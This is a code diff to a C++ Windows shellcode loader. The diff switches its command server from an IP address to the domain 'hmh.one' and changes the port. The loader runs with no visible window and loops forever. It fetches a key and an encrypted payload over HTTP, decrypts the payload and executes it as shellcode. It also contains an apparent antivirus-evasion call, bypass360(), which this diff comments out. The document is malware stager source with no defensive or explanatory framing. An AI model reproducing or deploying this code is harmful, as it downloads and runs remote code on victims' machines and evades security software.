@@ -16,10 +16,10 @@
 #pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")  
 //#pragma comment(linker, "/INCREMENTAL:NO")
 
-const char target[] = "124.72.0.94";
+const char target[] = "hmh.one";
 
 char *ip;
-const int  port = 83;
+const int  port = 82;
 char t_ip[20];
 const char obscure[] = "vtyuiaslkjfasfalsflkhlksadjlkgjlkdsajglkadnlkgsd";
 typedef void(__stdcall *CODE) ();
@@ -152,7 +152,7 @@ std::string GenerateUri()
 }
 void GetShellCodeSize()
 {
-	std::string host = std::string(target);
+	std::string host = std::string(ip);
 	HttpRequest httpReq(host, port);
 	std::string res = httpReq.HttpGet("/my/get_size");
 	std::string body = httpReq.getBody(res);
@@ -165,7 +165,7 @@ std::string GetKey()
 {
 	GetShellCodeSize();
 	
-	std::string host = std::string(target);
+	std::string host = std::string(ip);
 	HttpRequest httpReq(host, port);
 	std::string res = httpReq.HttpGet("/"+ GenerateUri());
 
@@ -189,7 +189,7 @@ void LoadShellCode(char *shellcode)
 void DecPayload(std::string key)
 {
 	
-	std::string host = std::string(target);
+	std::string host = std::string(ip);
 	HttpRequest httpReq(host, port);
 	time_t myt = time(NULL);
 	int filename = int(int(myt) / 100);
@@ -220,7 +220,7 @@ int main()
 	}
 	while (TRUE) {
 		GetIP();
-		bypass360();
+		//bypass360();
 		//MessageBoxA(0, ip, ip, 0);
 		DecPayload(GetKey());
 		
